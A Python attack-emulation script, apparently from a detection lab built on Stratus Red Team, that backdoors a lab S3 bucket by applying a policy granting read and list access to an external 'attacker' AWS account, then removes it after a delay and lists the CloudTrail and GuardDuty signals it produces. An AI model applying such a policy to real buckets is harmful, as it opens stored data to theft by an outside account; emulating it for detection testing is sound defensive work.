"""
Technique : aws.exfiltration.s3-backdoor-bucket-policy
Tactic    : Exfiltration (T1537)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the S3 bucket.
  - AWS credentials must have s3:PutBucketPolicy + s3:DeleteBucketPolicy.

Detection signal:
  - s3:PutBucketPolicy granting access to an external AWS account principal.
  - GuardDuty: Policy:S3/BucketAnonymousAccessGranted (if wildcard principal used).

Revert:
  - attack.py removes the malicious policy automatically after a configurable delay.
  - Or run `pulumi destroy` in ../infra/ to remove all resources.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3

# External attacker-controlled account (Stratus default: 193672423079)
ATTACKER_ACCOUNT_ID = os.environ.get("ATTACKER_ACCOUNT_ID", "193672423079")
DWELL_TIME_S        = int(os.environ.get("DWELL_TIME_S", "15"))


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def malicious_policy(bucket_name: str, attacker_account: str) -> str:
    return json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid":       "AttackerReadAccess",
                "Effect":    "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{attacker_account}:root"},
                "Action":    ["s3:GetObject", "s3:GetBucketLocation", "s3:ListBucket"],
                "Resource":  [
                    f"arn:aws:s3:::{bucket_name}",
                    f"arn:aws:s3:::{bucket_name}/*",
                ],
            }
        ],
    })


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    bucket_name = infra.get("bucket_name", "")

    if not bucket_name:
        print("[!] bucket_name not in stack output — did you run pulumi up?")
        return

    session  = boto3.Session()
    s3_client = session.client("s3")

    # ── Step 1: Apply malicious bucket policy ─────────────────────────────────
    banner("Step 1 — Backdoor bucket policy (PutBucketPolicy)")
    policy = malicious_policy(bucket_name, ATTACKER_ACCOUNT_ID)
    s3_client.put_bucket_policy(Bucket=bucket_name, Policy=policy)
    print(f"  [+] Malicious policy applied to: {bucket_name}")
    print(f"  [+] Grants s3:GetObject + s3:ListBucket to account: {ATTACKER_ACCOUNT_ID}")
    print("  [!] CloudTrail event: s3:PutBucketPolicy")
    print("  [!] GuardDuty may raise: Policy:S3/BucketAnonymousAccessGranted")

    # ── Dwell ─────────────────────────────────────────────────────────────────
    if DWELL_TIME_S > 0:
        print(f"\n[*] Backdoor active for {DWELL_TIME_S}s (DWELL_TIME_S)")
        time.sleep(DWELL_TIME_S)

    # ── Revert: Remove malicious policy ───────────────────────────────────────
    banner("Revert — Remove malicious bucket policy (DeleteBucketPolicy)")
    s3_client.delete_bucket_policy(Bucket=bucket_name)
    print(f"  [+] Malicious policy removed from: {bucket_name}")

    banner("Complete")
    print("CloudTrail events generated: s3:PutBucketPolicy, s3:DeleteBucketPolicy")
    print("Run `pulumi destroy` in ../infra/ to remove the bucket.")


if __name__ == "__main__":
    main()
